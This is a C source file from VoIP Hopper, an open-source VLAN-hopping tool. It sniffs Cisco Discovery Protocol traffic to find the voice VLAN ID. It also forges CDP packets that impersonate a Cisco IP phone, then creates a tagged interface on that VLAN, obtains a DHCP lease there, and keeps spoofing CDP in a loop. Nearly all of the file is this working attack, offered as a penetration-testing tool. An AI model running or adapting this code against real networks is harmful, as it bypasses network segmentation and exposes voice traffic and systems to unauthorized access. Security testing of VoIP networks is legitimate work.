/*
    voiphopd - VoIP Hopper
    Copyright (C) 2008 Jason Ostrom <jpo@pobox.com>
    VIPER LABS,SIPERA,RICHARDSON,TX

    This file is part of VoIP Hopper.

    Voiphopd is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 3 of the License, or
    (at your option) any later version.

    Voiphopd is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

#include "includes.h"

#define ETHER_ADDR_LEN 6

struct ethernet_header {
        u_char  ether_dhost[ETHER_ADDR_LEN];
        u_char  ether_shost[ETHER_ADDR_LEN];
        u_short type_length;
};

struct logical_link_control {
        u_char  dsapigbit[1];
        u_char  ssapcrbit[1];
        u_char  controlfield[1];
        u_char  organizationc[3];
        u_char  pid[2];
};

struct vlan_header {
        u_char  other[2];
        u_short length;
};

#ifndef OS_WINDOWS

#include "pathnames.h"
#include "client.h"
#include "signals.h"
#include "protocols.h"
#include "packets.h"
#endif

#include "voiphop.h"
#include "tftp_client.h"

#define SNAP_LEN 1518

#define SIZE_ETHERNET 14

#define SIZE_LLC 8

#define SIZE_VLAN 4

#define SIZE_CDPHEADER 4

#define IP_ALEN         IP_ADDR_LEN
#define DEFAULT_NUMBER  100;
#define DEFAULT_LENGTH  1400;

u_char  CDP_DEST[6] = {0x1,0x0,0xC,0xCC,0xCC,0xCC};
#define CDP_FRAME_SIZE 1700
u_char cdpframe[CDP_FRAME_SIZE];

#ifndef OS_WINDOWS
#if 0
unsigned char   ClientMACaddr[ETH_ALEN];
int             ClientMACaddr_ind =     0;
#endif
#endif

char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;
struct bpf_program fp;
bpf_u_int32 mask;
bpf_u_int32 net;
const u_char *packet;
struct pcap_pkthdr *header;

#ifndef OS_WINDOWS
packet_ifconfig_t     packet_ifconfig;
#endif

void *send_cdp(void *);

#ifndef OS_WINDOWS

/*************** DHCP variables ********************/

struct in_addr  inform_ipaddr,default_router;
char            *ProgramName    =       NULL;
char            **ProgramEnviron=       NULL;
char            *IfName         =       DEFAULT_IFNAME;
char            *IfNameExt      =       DEFAULT_IFNAME;
//char          *IfName;
//char          *IfNameExt;
char            *RemIfName      =       DEFAULT_IFNAME;
int             IfName_len      =       DEFAULT_IFNAME_LEN;
int             IfNameExt_len   =       DEFAULT_IFNAME_LEN;
char            *HostName       =       NULL;
int             HostName_len    =       0;
char            *Cfilename      =       NULL;
unsigned char   *ClassID        =       NULL;
int             ClassID_len     =       0;
unsigned char   *ClientID       =       NULL;
int             ClientID_len    =       0;
void            *(*currState)() =       &dhcpStart;
int             DebugFlag       =       1;
int             BeRFC1541       =       0;
unsigned        LeaseTime       =       DEFAULT_LEASETIME;
int             ReplResolvConf  =       1;
int             ReplNISConf     =       1;
int             ReplNTPConf     =       1;
int             SetDomainName   =       0;
int             SetHostName     =       0;
int             BroadcastResp   =       0;
time_t          TimeOut         =       DEFAULT_TIMEOUT;
int             magic_cookie    =       0;
unsigned short  dhcpMsgSize     =       0;
unsigned        nleaseTime      =       0;
int             DoCheckSum      =       0;
int             TestCase        =       0;
int             SendSecondDiscover      =       0;
int             Window          =       0;
char            *ConfigDir      =       CONFIG_DIR;
int             SetDHCPDefaultRoutes=   1;
int             avvid           =       0;
int             *avvid2         =       0;
char            apattern[]      =       "L2QVLAN=";

#endif

u_int16_t chksum(u_char *data, unsigned long count) {
    u_int32_t           sum = 0;
    u_int16_t           *wrd;

    wrd=(u_int16_t *)data;
    while( count > 1 )  {
        sum = sum + *wrd;
        wrd++;
        count -= 2;
    }

    /*  Add left-over byte, if any */
    if( count > 0 ) {
            /*printf("Left over byte in chksum: %04X\n",((*wrd & 0xFF)<<8));*/
        sum = sum + ((*wrd &0xFF)<<8);
    }

    /*  Fold 32-bit sum to 16 bits */
    while (sum>>16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (~sum);
}

#ifndef OS_WINDOWS

int dhcpclientcall(char *vinterface){


        /* buddy */
        int killFlag = 0;
        int versionFlag = 0;
        int s = 1;
        char *ProgramName = NULL;
        char **ProgramEnviron = NULL;
        int i = 1;
        int vvid;
        umask(022);

	IfName_len = strlen(vinterface);
        IfNameExt_len = strlen(vinterface);

	IfName = malloc ((strlen(vinterface)+1)*sizeof(char));
	if(IfName == NULL){
		printf("Error allocating memory, %s \n", strerror(errno));
		exit(1);
	}
	IfNameExt = malloc((strlen(vinterface)+1)*sizeof(char));
        if(IfNameExt == NULL){
                printf("Error allocating memory, %s \n", strerror(errno));
                exit(1);
        }
        strcpy(IfName,vinterface);
        strcpy(IfNameExt,vinterface);


        if ( killFlag ) killPid(killFlag);
        //if ( ! TestCase ) checkIfAlreadyRunning();

	if(verbosity)
        	printf("Sending DHCP request on %s\n",IfName);

        //if ( versionFlag ) print_version();
        openlog(PROGRAM_NAME,LOG_PID|(DebugFlag?LOG_CONS:0),LOG_LOCAL0);
        signalSetup();
        if ( mkdir(ConfigDir,S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH) && errno != EEXIST )
        {
                syslog(LOG_ERR,"mkdir(\"%s\",0): %m\n",ConfigDir);
                exit(1);
        }
        magic_cookie = htonl(MAGIC_COOKIE);
        dhcpMsgSize = htons(sizeof(dhcpMessage));
        nleaseTime = htonl(LeaseTime);
        alarm(TimeOut);
        do {
                if ( (currState=(void *(*)())currState()) == NULL ){
                        exit(1);
                                }
        } while ( currState != &dhcpBound );

        #if 0
        if ( TestCase ) exit(0);
        #endif
	alarm(0);
        #ifdef DEBUG
        writePidFile(getpid());
        #else
        #ifdef EMBED
        /*s=vfork();*/
        #else
        /*s=fork();*/
        #endif
        if ( s )
        {
        writePidFile(s);
        /*exit(0);*/
        /* got into bound state. */
        }

        avvid2 = &avvid;
        vvid = *avvid2;
        setsid();

        #endif
        //chdir("/");

        deletePidFile();

        return vvid;

}

/* opens the raw socket,
 * RETURNS 0 on success or -1 on error */
int     init_socket_eth(char *device) {
    int                 sfd;
    struct ifreq        ifr;
  
    if ((sfd=socket(PF_INET, SOCK_PACKET, htons(ETH_P_ALL)))<0) {
        perror("socket()");
        return (-1);
    }

    /* get HW addr */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, device, sizeof (ifr.ifr_name));
    if (ioctl(sfd, SIOCGIFHWADDR, &ifr) < 0 ) {
        perror("ioctl()");
        return (-1);
    }
    memcpy(&(packet_ifconfig.eth),&ifr.ifr_hwaddr.sa_data,ETH_ALEN);

    /* grab the IP address */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, device, sizeof (ifr.ifr_name));
    if (ioctl(sfd, SIOCGIFADDR, &ifr) < 0 ) {
        perror("ioctl()");
        return (-1);
    }
    memcpy(&(packet_ifconfig.ip.s_addr),
            &(*(struct sockaddr_in *)&ifr.ifr_addr).sin_addr.s_addr,
            IP_ADDR_LEN);

    /* get MTU for size */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, device, sizeof (ifr.ifr_name));
    if (ioctl(sfd, SIOCGIFMTU, &ifr) < 0 ) {
        perror("ioctl()");
        return (-1);
    }
    packet_ifconfig.mtu=ifr.ifr_mtu;
    /* get broadcast addr for size */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, device, sizeof (ifr.ifr_name));
    if (ioctl(sfd, SIOCGIFBRDADDR, &ifr) < 0 ) {
        perror("ioctl()");
        return (-1);
    }
    memcpy(&(packet_ifconfig.bcast.s_addr),
            &(*(struct sockaddr_in *)&ifr.ifr_addr).sin_addr.s_addr,
            IP_ADDR_LEN);

    return sfd;
}

/* send's the ethernet frame,
 * RETURNS the number of octets send or -1 on error */
int     sendpack_eth(char *device, int atsock,
                u_char *frame, int frame_length) {
    struct sockaddr     sa;
    int                 sendBytes;


    memset(&sa,0,sizeof(sa));
    strncpy(sa.sa_data,device,sizeof(sa.sa_data));

    sendBytes=sendto(atsock,frame,frame_length,0,&sa,sizeof(sa));
    if (sendBytes<0) {
        perror("send_ethernet_frame(): sendto");
        return (-1);
    } else if (sendBytes<frame_length) {
        fprintf(stderr,"send_ethernet_frame(): "
                "WARNING: short send %d out off %d\n",sendBytes,frame_length);
    }

    return sendBytes;
}

void create_vlan_interface(char *IfName_temp,int vvid){

	struct vlan_ioctl_args if_request;
                int fd;

                strcpy(if_request.device1, IfName_temp);
                if_request.u.VID = vvid;

                if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                        fprintf(stderr, "Fatal:  Couldn't open socket\n");
                        exit(2);
                }

                if_request.cmd = ADD_VLAN_CMD;
                if (ioctl(fd, SIOCSIFVLAN, &if_request) < 0) {
                        fprintf(stderr,"Error trying to add VLAN %u to Interface %s: %s\n",
                        vvid, IfName, strerror(errno));
                } else {
			if(verbosity)
                        	printf("Added VLAN %u to Interface %s\n",vvid, IfName_temp);
                }
}

#endif	

pcap_t * create_cdp_pcap(char *IfName_temp){

	char filter_exp[] = "ether host 01:00:0c:cc:cc:cc and (ether[20:2] = 0x2000 or ether[24:2] = 0x2000)";

	if (IfName_temp == NULL) {
                        IfName_temp = pcap_lookupdev(errbuf);
                        if (IfName_temp == NULL) {
                                fprintf(stderr, "Couldn't find default device: %s\n",errbuf);
                                exit(EXIT_FAILURE);
                        }
                        printf("Interface not specified - Using first usable default device: ");
                        printf("%s\n", IfName_temp);
                }

                if (pcap_lookupnet(IfName_temp, &net, &mask, errbuf) == -1) {
                        fprintf(stderr, "Couldn't get netmask for device %s.  Enable the interface first and assign an IP address: %s\n", IfName_temp, errbuf);
                        net = 0;
                        mask = 0;
                        exit(EXIT_FAILURE);
                }

               	printf("Capturing CDP Packets on %s\n", IfName_temp);

                handle = pcap_open_live(IfName_temp, SNAP_LEN, 1, 1000, errbuf);
                if (handle == NULL) {
                        fprintf(stderr, "Couldn't open device %s: %s\n", IfName_temp, errbuf);
                        exit(EXIT_FAILURE);
                }

                if (pcap_datalink(handle) != DLT_EN10MB) {
                        fprintf(stderr, "\n%s is not an Ethernet Interface\n", IfName_temp);
                        exit(EXIT_FAILURE);
                }

                if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
                        fprintf(stderr, "Couldn't parse filter %s: %s\n",
                            filter_exp, pcap_geterr(handle));
                        exit(EXIT_FAILURE);
                }

                if (pcap_setfilter(handle, &fp) == -1) {
                        fprintf(stderr, "Couldn't install filter %s: %s\n",
                            filter_exp, pcap_geterr(handle));
                        exit(EXIT_FAILURE);
                }

	  return handle;
}

#ifndef OS_WINDOWS

unsigned int mk_spoof_cdp(char *mdeviceid,char *mportid,char *msoftware,char *mplatform,char *mcapas,char *mduplex) {

    struct eth_ieee802_3        *ethh;
    struct eth_LLC              *llc;
    struct cdphdr               *cdph;
    struct cdp_device           *cdp_dev;
    /*struct cdp_address          *cdp_addr;*/
    /*struct cdp_address_entry    *cdp_ae;*/
    struct cdp_port             *cdp_prt;
    struct cdp_capabilities     *cdp_caps;
    struct cdp_software         *cdp_soft;
    struct cdp_platform         *cdp_plt;
    struct cdp_vvlanquery       *cdp_vvq;
    struct cdp_duplex           *cdp_dup;
    struct cdp_power            *cdp_pow;
    u_char                      *cdp_end;
    u_int16_t                   cs;

if(verbosity){
    printf("Device ID: %s;",mdeviceid);
    printf("    Port ID: %s;",mportid);
    printf("    Software: %s\n",msoftware);
    printf("Platform: %s;",mplatform);
    printf("    Capabilities: %s;",mcapas);
    printf("    Duplex: %s\n",mduplex);
}

    memset(&cdpframe,0,sizeof(cdpframe));

    /* make IEEE 802.3 header */
    ethh=(struct eth_ieee802_3 *)cdpframe;
    memcpy(&(ethh->saddr),&(packet_ifconfig.eth),ETH_ALEN);
    memcpy(&(ethh->daddr),&CDP_DEST,ETH_ALEN);
    ethh->length=0;

    /* build LLC header */
    llc=(struct eth_LLC *)(cdpframe+sizeof(struct eth_ieee802_3));
    llc->DSAP=0xAA;
    llc->SSAP=0xAA;
    llc->Control=0x03;  /* unnumbered */
    llc->orgcode[0]=llc->orgcode[1]=0x00;
    llc->orgcode[2]=0x0c;                       /* cisco */
    llc->proto=htons(0x2000);

    /* build cdp header */
    cdph=(struct cdphdr *)((void*)llc+sizeof(struct eth_LLC));
    cdph->version=0x02;
    cdph->ttl=180;
    cdph->checksum=0x0000;

    /* make a device id entry */
    cdp_dev=(struct cdp_device *)((void *)cdph+sizeof(struct cdphdr));
    cdp_dev->type=htons(TYPE_DEVICE_ID);
    cdp_dev->length=htons(strlen(mdeviceid)+2*sizeof(u_int16_t));
    memcpy(&(cdp_dev->device),mdeviceid,strlen(mdeviceid));

    /* make an address entry */
    /*
    cdp_addr=(struct cdp_address *)((void *)cdp_dev+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mdeviceid)));
    cdp_addr->type=htons(TYPE_ADDRESS);
    cdp_addr->length=htons(
            sizeof(struct cdp_address)+sizeof(struct cdp_address_entry)+3);
    cdp_addr->number=htonl(0x00000001);
    */

    /* insert our address */
    /*
    cdp_ae=(struct cdp_address_entry *)((void *)cdp_addr+sizeof(struct cdp_address));
    cdp_ae->proto_type=0x01;
    cdp_ae->length=0x01;
    cdp_ae->proto=0xCC;
    cdp_ae->addrlen[1]=0x04;
    memcpy(&(cdp_ae->addr),&(mipaddr),IP_ALEN);
    */

    /* make CDP port entry */
    /*cdp_prt=(struct cdp_port *)((void *)cdp_ae+*/
           /*(sizeof (struct cdp_address_entry)+3));*/
    cdp_prt=(struct cdp_port *)((void *)cdp_dev+(sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mdeviceid)));
    cdp_prt->type=htons(TYPE_PORT_ID);
    cdp_prt->length=htons(strlen(mportid)+2*sizeof(u_int16_t));
    memcpy(&(cdp_prt->port),mportid,strlen(mportid));
    /* make CDP capabilities entry */
    cdp_caps=(struct cdp_capabilities *)((void *)cdp_prt+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mportid)));
    cdp_caps->type=htons(TYPE_CAPABILITIES);
    cdp_caps->length=htons(0x0008);
    cdp_caps->capab=0;
    if (strchr(mcapas,'R'))
        cdp_caps->capab=CDP_CAP_LEVEL3_ROUTER;
    if (strchr(mcapas,'T'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_TRBR;
    if (strchr(mcapas,'B'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_SRB;
    if (strchr(mcapas,'S'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_SWITCH;
    if (strchr(mcapas,'H'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_NETWORK_LAYER;
    if (strchr(mcapas,'I'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_FORWARD_IGMP;
    if (strchr(mcapas,'r'))
        cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL1;
    cdp_caps->capab=htonl(cdp_caps->capab);

    /* make CDP software version */
    cdp_soft=(struct cdp_software *)((void *)cdp_caps+
            sizeof(struct cdp_capabilities));
    cdp_soft->type=htons(TYPE_IOS_VERSION);
    cdp_soft->length=htons(strlen(msoftware)+2*sizeof(u_int16_t));
    memcpy(&(cdp_soft->software),msoftware,strlen(msoftware));

    /* make CDP platform */
    cdp_plt=(struct cdp_platform *)((void *)cdp_soft+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(msoftware)));
    cdp_plt->type=htons(TYPE_PLATFORM);
    cdp_plt->length=htons(strlen(mplatform)+2*sizeof(u_int16_t));
    memcpy(&(cdp_plt->platform),mplatform,strlen(mplatform));

    /* Normally the VVQ is first.  For some reason the Power Entry and VVQ had to be reversed
    * otherwise if the power bytes entry is last in the CDP frame,
    * there is a CDP checksum error.  Will get to this later when
    * I have more time
    */
    /* Test Power Consumption */
    cdp_pow=(struct cdp_power *)((void *)cdp_plt+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mplatform)));
    cdp_pow->type=htons(TYPE_POWER);
    u_char powerc_send_bytes[2] = {0x18,0x9C};
    cdp_pow->length=htons(2+2*sizeof(u_int16_t));
    memcpy(&(cdp_pow->powerstring),powerc_send_bytes,2);

    /* make CDP VoIP VLAN Query */
    /*
    cdp_vvq=(struct cdp_vvlanquery *)((void *)cdp_plt+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mplatform)));
    cdp_vvq->type=htons(TYPE_VOIPVLANQUERY);
    u_char vvq_send_bytes[4] = {0x20,0x02,0x0,0x1};
    cdp_vvq->length=htons(4+2*sizeof(u_int16_t));
    memcpy(&(cdp_vvq->vvlanquery),vvq_send_bytes,4);
    */

    /* make CDP Full Duplex */
    cdp_dup=(struct cdp_duplex *)((void *)cdp_pow+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + 2));
    /*cdp_dup=(struct cdp_duplex *)((void *)cdp_plt+(*/
            /*sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mplatform)));*/
    cdp_dup->type=htons(TYPE_DUPLEX);
    cdp_dup->length=htons(strlen(mduplex)+2*sizeof(u_int16_t));
    memcpy(&(cdp_dup->duplex),mduplex,strlen(mduplex));


    /* Test VVQ */
    /* For some reason the Power Entry and VVQ had to be reversed
    * otherwise if the power bytes entry is last in the CDP frame,
    * there is a CDP checksum error.  Will get to this later when
    * I have more time
    */
    cdp_vvq=(struct cdp_vvlanquery *)((void *)cdp_dup+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mduplex)));
    cdp_vvq->type=htons(TYPE_VOIPVLANQUERY);
    u_char vvq_send_bytes[4] = {0x20,0x02,0x0,0x1};
    cdp_vvq->length=htons(4+2*sizeof(u_int16_t));
    memcpy(&(cdp_vvq->vvlanquery),vvq_send_bytes,4);
    /* make CDP Power Consumption */
    /*
    cdp_pow=(struct cdp_power *)((void *)cdp_dup+(
            sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mduplex)));
    cdp_pow->type=htons(TYPE_POWER);
    u_char powerc_send_bytes[2] = {0x18,0x9C};
    cdp_pow->length=htons(2+2*sizeof(u_int16_t));
    memcpy(&(cdp_pow->powerstring),powerc_send_bytes,2);
    */

    cdp_end=(u_char *)((void *)cdp_vvq+(sizeof(u_int16_t) + sizeof(u_int16_t) + 4));
    /*cdp_end=(u_char *)((void *)cdp_plt+(sizeof(u_int16_t) + sizeof(u_int16_t) + strlen(mplatform)));*/

    ethh->length=htons((unsigned int)((void *)cdp_end-(void *)llc));

    cs=chksum((u_char *)cdph,((void *)cdp_end-(void *)cdph));
    /*printf("checksum is %04X\n",cs);*/
    cdph->checksum=cs;

    return ((void *)cdp_end-(void *)&cdpframe[0]);
}

#endif

int get_cdp(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

        int packetlen = header->len;
        int size_cdp_data;
        static int count = 1;
        const struct ethernet_header *eth_ptr;
        const struct logical_link_control *llc;
        int vvlan_id = 0;

        eth_ptr = (struct ethernet_header*)(packet);

        if (ntohs(eth_ptr->type_length) <= 1500) {

                llc = (struct logical_link_control*)(packet + SIZE_ETHERNET);
                size_cdp_data = ntohs(eth_ptr->type_length) - SIZE_LLC;

		if(verbosity)
                	printf("Captured IEEE 802.3, CDP Packet of %d bytes\n",size_cdp_data);

                struct CDPFirstFields {

                        u_short type;
                        u_short length;

                };

                struct CDPHeader {

                        u_char cdpversion[1];
                        u_char cdpttl[1];
                        u_short cdpchecksum;

                };

                const struct CDPHeader *cdpheader;
                cdpheader = (struct CDPHeader*)(packet + SIZE_ETHERNET + SIZE_LLC);

                size_cdp_data = ntohs (eth_ptr->type_length) - SIZE_LLC - SIZE_CDPHEADER;
                int bytes_to_analyze = 0;
                int cdp_toffset = 0;
                int cdp_poffset = 0;
                int cdp_flength;

		while (bytes_to_analyze < size_cdp_data){

                        const struct CDPFirstFields *cdpfirstfields;
                        cdpfirstfields = (struct CDPFirstFields*)(packet + SIZE_ETHERNET + SIZE_LLC + SIZE_CDPHEADER + cdp_toffset);

                        cdp_flength = ntohs(cdpfirstfields->length);
                        cdp_poffset = cdp_poffset + 4;

                        int cdp_type = ntohs(cdpfirstfields->type);
                        if (cdp_type == 14) {

                                struct VoIPVLANReply {

                                        u_short voicevlan;

                                };

                                const struct VoIPVLANReply *voipvlanreply;
                                voipvlanreply = (struct VoIPVLANReply*)(packet + SIZE_ETHERNET + SIZE_LLC +SIZE_CDPHEADER + cdp_poffset + 1);
                                vvlan_id = ntohs(voipvlanreply->voicevlan);
                                printf("Discovered VoIP VLAN: %d\n",vvlan_id);

                        } else {

                                const u_char *cdp_data;
                                cdp_data = (u_char *)(packet + SIZE_ETHERNET + SIZE_LLC + SIZE_CDPHEADER + cdp_poffset);
                        }

                bytes_to_analyze = bytes_to_analyze + cdp_flength;
                cdp_toffset = cdp_toffset + cdp_flength;
                cdp_poffset = cdp_toffset;

                }

                if (vvlan_id == 0) {
                printf("Couldn't discover VoIP VLAN Reply field in CDP Packet data\n\n");
                }

        } else {

		/*printf("Ethernet II packet\n");*/
                if (ntohs(eth_ptr->type_length) == 33024){
                        /*printf("Type 802.1Q Virtual LAN\n");*/
                }

                const struct vlan_header *vlan;
                vlan = (struct vlan_header*)(packet + SIZE_ETHERNET);
                llc = (struct logical_link_control*)(packet + SIZE_ETHERNET + SIZE_VLAN);

                size_cdp_data = ntohs (vlan->length) - SIZE_LLC;
                printf("Captured Ethernet II, CDP Packet of %d bytes\n",size_cdp_data);

                struct CDPFirstFields {

                        u_short type;
                        u_short length;

                };

                struct CDPHeader {

                        u_char cdpversion[1];
                        u_char cdpttl[1];
                        u_short cdpchecksum;

                };

                const struct CDPHeader *cdpheader;
                cdpheader = (struct CDPHeader*)(packet + SIZE_ETHERNET + SIZE_VLAN + SIZE_LLC);

                size_cdp_data = ntohs (vlan->length) - SIZE_VLAN - SIZE_LLC - SIZE_CDPHEADER;
                int bytes_to_analyze = 0;
                int cdp_toffset = 0;
                int cdp_poffset = 0;
                int cdp_flength;

		while (bytes_to_analyze < size_cdp_data){

                        const struct CDPFirstFields *cdpfirstfields;
                        cdpfirstfields = (struct CDPFirstFields*)(packet + SIZE_ETHERNET + SIZE_VLAN + SIZE_LLC + SIZE_CDPHEADER + cdp_toffset);

                        cdp_flength = ntohs(cdpfirstfields->length);
                        cdp_poffset = cdp_poffset + 4;

                        int cdp_type = ntohs(cdpfirstfields->type);
                        if (cdp_type == 14) {

                                struct VoIPVLANReply {

                                        u_short voicevlan;

                                };

                                const struct VoIPVLANReply *voipvlanreply;
                                voipvlanreply = (struct VoIPVLANReply*)(packet + SIZE_ETHERNET + SIZE_VLAN + SIZE_LLC + SIZE_CDPHEADER + cdp_poffset + 1);
                                vvlan_id = ntohs(voipvlanreply->voicevlan);
                                printf("Discovered VoIP VLAN: %d\n",vvlan_id);

                        } else {

                                const u_char *cdp_data;
                                cdp_data = (u_char *)(packet + SIZE_ETHERNET + SIZE_LLC + SIZE_CDPHEADER + cdp_poffset);
                        }

                bytes_to_analyze = bytes_to_analyze + cdp_flength;
                cdp_toffset = cdp_toffset + cdp_flength;
                cdp_poffset = cdp_toffset;

                }


                if (vvlan_id == 0) {
                printf("Couldn't discover VoIP VLAN Reply field in CDP Packet data\n\n");
                }

        }

return vvlan_id;

}

int cdp_mode(int mode , char *IfName_temp){

	/* MODE ZERO goes into CDP sniff mode */

	unsigned int retval;
	pcap_t *pcap_handle;
	

	if(mode == 0){
					
		pcap_handle = create_cdp_pcap(IfName_temp);
		
		int vvid = 0;
        while (vvid == 0) {
			int pcap_return = pcap_next_ex(handle, &header, &packet);
				if (pcap_return < 0) {
					printf("Error in pcap_next_ex\n");
                } else {
					u_char *args;
                    vvid = get_cdp(args, header, packet);
                }
        }

        pcap_freecode(&fp);
        pcap_close(handle);
#ifndef OS_WINDOWS 
		create_vlan_interface(IfName_temp,vvid);
		char vinterface[BUFSIZ];
        snprintf(vinterface, sizeof(vinterface), "%s.%d", IfName_temp, vvid);
        int return_value = dhcpclientcall(vinterface);
		return vvid;
#else
		return vvid;
#endif
	}

	else if(mode == 1){

		pcap_t *pcap_handle;

#ifndef OS_WINDOWS

		int atsock;
		int vvid = 0;
		
		if ((atsock=init_socket_eth(IfName_temp))<=0){
                        printf("The interface %s must have a valid IP address in order for the CDP spoofing code to work.\nFirst set the IP address static or via DHCP, and then run again.\n",IfName);
                                printf("Could not initialize CDP attack socket\n");
                                exit(1);
                }

		char *S_deviceid         = "SEP123456789123";
                char *S_portid           = "Port 1";
                char *S_capas       	 = "Host";
                char *S_platform         = "cisco WS-C3560G-4PS";
                char *S_software         = "P003-08-8-00";
                char *S_duplex           = "1";
	

		pcap_handle = create_cdp_pcap(IfName_temp);

		/* First CDP Packet when Phone boots */
		if(verbosity){
                	printf("Sending 1st CDP Spoofed packet on %s with CDP packet data:\n",IfName_temp);
		}
                /*retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex,S_ipaddr);*/
                retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex);
		if(verbosity){
                	printf("Made CDP packet of %d bytes - ",retval);
		}

                int retval2;
                retval2 = sendpack_eth(IfName_temp,atsock,cdpframe,retval);
		if(verbosity){
                	printf("Sent CDP packet of %d bytes\n",retval2);
		}

                /* Get the sent packet off the buffer wire*/
                int pcap_return = pcap_next_ex(handle, &header, &packet);

                while (vvid == 0) {

                int pcap_return = pcap_next_ex(handle, &header, &packet);

                if (pcap_return < 0) {
                	printf("Error in pcap_next_ex\n");
                } else {
                        u_char *args;
                        vvid = get_cdp(args, header, packet);
                }
                }

		/* Second CDP Packet when Phone boots */
		if(verbosity){
                	printf("Sending 2nd CDP Spoofed packet on %s with CDP packet data:\n",IfName_temp);
		}
                /*retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex,S_ipaddr);*/
                retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex);
		if(verbosity){
                	printf("Made CDP packet of %d bytes - ",retval);
		}

                retval2 = sendpack_eth(IfName_temp,atsock,cdpframe,retval);
		if(verbosity){
                	printf("Sent CDP packet of %d bytes\n",retval2);
		}

                /* Get the sent packet off the buffer / wire*/
                pcap_return = pcap_next_ex(handle, &header, &packet);

                while (vvid == 0) {

  	              int pcap_return = pcap_next_ex(handle, &header, &packet);

                      if (pcap_return < 0) {
	                      printf("Error in pcap_next_ex\n");
                      } else {
       		                       u_char *args;
                                       vvid = get_cdp(args, header, packet);
                      }
                }

                pcap_freecode(&fp);
                pcap_close(handle);
                /* End Using pcap */

		create_vlan_interface(IfName_temp,vvid);

		char vinterface[BUFSIZ];
                snprintf(vinterface, sizeof(vinterface), "%s.%d", IfName_temp, vvid);

                int return_value = dhcpclientcall(vinterface);

		pthread_t threads[1];
		int rc,t;
		
		rc = pthread_create(&threads[0],NULL,send_cdp,(void *)atsock);
		if(rc){
			printf("Error: pthread_create error %d \n",rc);
			exit(-1);
		}
#else
		pcap_handle = create_cdp_pcap(IfName_temp);
		if(pcap_handle == NULL)
			return -1;

		int ret_value = cdp_spoof_mode(IfName_temp);
		if(ret_value == -1){
				printf("CDP Spoof mode failed\n");
				pcap_freecode(&fp);
                pcap_close(handle);
				return ret_value;
		}
		
		int vvid = 0;
                while (vvid == 0) {
					
                        int pcap_return = pcap_next_ex(handle, &header, &packet);
                        if (pcap_return < 0) {
                                printf("Error in pcap_next_ex\n");
                        } else {
                                u_char *args;
                                vvid = get_cdp(args, header, packet);
                        }
                }

                pcap_freecode(&fp);
                pcap_close(handle);
			return vvid;
#endif
	}		        			
} 

int vlan_hop(int vvid,char *IfName_temp){

#ifndef OS_WINDOWS

	create_vlan_interface(IfName_temp,vvid);
	char vinterface[BUFSIZ];
        snprintf(vinterface, sizeof(vinterface), "%s.%d", IfName_temp, vvid);
        int return_value = dhcpclientcall(vinterface);
	return return_value;
#endif

} 


void *send_cdp(void *threadarg){

#ifndef OS_WINDOWS

	int atsock; 
	atsock = (int)threadarg;
	int retval;	
	
	unsigned int ksleeps;
        unsigned int sleepseconds = 60;
        ksleeps = sleep(sleepseconds);

	char *S_deviceid         = "SEP123456789123";
        char *S_portid           = "Port 1";
        char *S_capas            = "Host";
        char *S_platform         = "cisco WS-C3560G-4PS";
        char *S_software         = "P003-08-8-00";
        char *S_duplex           = "1";


        for ( ; ; ){

		if(verbosity){
       			printf("Sending CDP Spoofed packet on %s with CDP packet data:\n",IfName);
		}
                /*retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex,S_ipaddr);*/
                retval = mk_spoof_cdp(S_deviceid,S_portid,S_software,S_platform,S_capas,S_duplex);
                if(verbosity){
			printf("Made CDP packet of %d bytes - ",retval);
		}

                int retval2;
                retval2 = sendpack_eth(IfName,atsock,cdpframe,retval);
 
		if(verbosity){ 
		        printf("Sent CDP packet of %d bytes\n",retval2);
	                printf("Sleeping for 60 seconds before sending another CDP packet\n\n");
                }

		ksleeps = sleep(sleepseconds);

        }
#endif
	
} 
